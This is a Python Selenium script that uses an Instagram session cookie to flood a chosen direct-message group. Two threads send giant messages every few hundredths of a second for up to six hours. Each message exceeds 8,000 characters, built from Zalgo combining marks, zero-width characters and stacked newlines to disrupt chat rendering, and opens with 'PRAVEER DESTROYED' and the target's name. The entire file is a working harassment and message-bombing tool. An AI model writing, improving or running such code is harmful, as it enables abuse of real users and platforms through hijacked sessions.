# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (VERTICAL BLOCK)
# 📅 STATUS: 8K VERTICAL BLOAT | RAM-OPTIMIZED | 2 THREADS

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- VERTICAL BLOCK CONFIG ---
THREADS = 2             
TOTAL_DURATION = 21600  
BURST_SPEED = (0.01, 0.08) 
SESSION_LIMIT = 80 # Restarting faster to handle the massive vertical rendering

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()

def get_vertical_block_payload(target):
    """Generates an 8,000+ character Vertical Skyscraper."""
    # Massive Zalgo Tower for vertical "bleeding"
    z_tower = "̸" * 30
    praveer_name = "".join(c + z_tower for c in f"PRAVEER_NC")
    
    # Invisible Bloat blocks
    bloat_chars = ["\u200B", "\u200D", "‎", "‏"]
    bloat = "".join(random.choice(bloat_chars) for _ in range(1000))
    
    # Building the Vertical "Skyscraper"
    # We use multiple \n (newlines) to force height
    lines = []
    lines.append(f"🔥 PRAVEER DESTROYED {target.upper()} 🔥")
    lines.append(bloat)
    for _ in range(15): # 15 levels of vertical corruption
        lines.append(praveer_name + " " + "".join(random.choice(bloat_chars) for _ in range(200)))
    lines.append(bloat)
    lines.append("🛑" * 60)
    
    return "\n".join(lines)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"vertical_praveer_{agent_id}_{int(time.time())}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")

    driver = webdriver.Chrome(options=chrome_options)
    return driver

def adaptive_inject(driver, text):
    try:
        box = driver.find_element(By.XPATH, "//div[@role='textbox']")
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, box, text)
        box.send_keys(Keys.ENTER)
        return True
    except:
        return False

def run_life_cycle(agent_id, cookie, target):
    global GLOBAL_SENT
    start_time = time.time()

    while (time.time() - start_time) < TOTAL_DURATION:
        driver = None
        temp_path = None
        session_start = time.time()
        
        try:
            driver = get_driver(agent_id)
            temp_path = getattr(driver, 'custom_temp_path', None)
            
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(6)
            
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(7)

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_vertical_block_payload(os.getenv("TARGET_NAME", "User"))
                
                if adaptive_inject(driver, payload):
                    with COUNTER_LOCK:
                        GLOBAL_SENT += 1
                        print(f"[!] VERTICAL IMPACT {GLOBAL_SENT} | SIZE: 8K+", flush=True)
                
                time.sleep(random.uniform(*BURST_SPEED))

        except Exception:
            pass 
        finally:
            if driver: driver.quit()
            if temp_path and os.path.exists(temp_path): shutil.rmtree(temp_path, ignore_errors=True)
            gc.collect()
            time.sleep(2)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
